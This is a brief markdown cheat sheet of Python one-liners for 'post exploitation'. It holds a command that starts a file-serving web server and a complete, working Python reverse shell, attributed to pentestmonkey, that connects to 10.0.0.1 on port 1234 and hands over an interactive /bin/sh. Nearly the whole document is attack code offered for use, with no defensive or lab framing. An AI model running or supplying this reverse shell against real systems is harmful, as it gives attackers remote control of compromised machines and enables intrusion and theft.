# Python Command and Scripts for Post Exploitation

One liners
-----------

**Start a web server that serves the local files on port 8000, single threaded**
```python
python -m SimpleHTTPServer 8000
```

**Python reverse shell from [pentestmonkey.net](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)**

```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```